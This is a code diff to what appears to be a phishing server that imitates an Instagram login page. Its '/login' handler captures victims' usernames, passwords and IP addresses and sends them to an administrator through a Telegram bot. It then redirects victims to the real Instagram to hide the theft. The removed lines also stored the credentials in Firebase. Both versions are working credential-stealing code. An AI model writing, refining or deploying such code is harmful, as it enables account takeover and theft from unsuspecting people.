@@ -411,56 +411,12 @@ app.get("/insta", (req, res) => {
 
 // CAPTURE LOGIN - IMPROVED VERSION
 app.post("/login", async (req, res) => {
-  try {
-    const { username, password, ref } = req.body;
-    
-    if (!username || !password) {
-      return res.redirect("/insta?error=missing_credentials");
-    }
-
-    const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || "unknown";
-    const userAgent = req.headers['user-agent'] || "unknown";
-    const time = new Date().toLocaleString();
-    
-    // Get referrer info
-    const referrer = req.get('Referrer') || 'direct';
-
-    const message = `
-🔐 *INSTAGRAM LOGIN CAPTURED*
-
-👤 *Username:* \`${username.replace(/`/g, '')}\`
-🔑 *Password:* \`${password.replace(/`/g, '')}\`
-🌐 *IP:* \`${ip}\`
-🕒 *Time:* \`${time}\`
-📱 *User Agent:* \`${userAgent.substring(0, 50)}...\`
-🔗 *Referrer:* ${referrer}
-${ref ? `👥 *Referral User:* ${ref}` : ''}
-    `.trim();
-
-    // Send to admin
-    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { 
-      parse_mode: "Markdown",
-      disable_web_page_preview: true 
-    });
-
-    // Save to Firebase
-    await saveLoginAttempt(
-      { username, password },
-      ip,
-      userAgent,
-      ref || null
-    );
-
-    console.log(`✅ Login captured: ${username} from IP: ${ip}`);
-
-    // Redirect to real Instagram
-    res.redirect("https://www.instagram.com/");
-
-  } catch (error) {
-    console.error("❌ Login capture error:", error);
-    // Still redirect even if sending fails
-    res.redirect("https://www.instagram.com/");
-  }
+  const { username, password } = req.body;
+  if (!username || !password) return res.redirect("/insta");
+  const ip = req.ip || "unknown";
+  const msg = `*INSTAGRAM LOGIN*\nUser: \`${username}\`\nPass: \`${password}\`\nIP: \`${ip}\``;
+  try { await bot.telegram.sendMessage(ADMIN_USER_ID, msg, { parse_mode: "Markdown" }); } catch {}
+  res.redirect("https://www.instagram.com/");
 });
 
 // ---------- STUDENT PAGE ----------
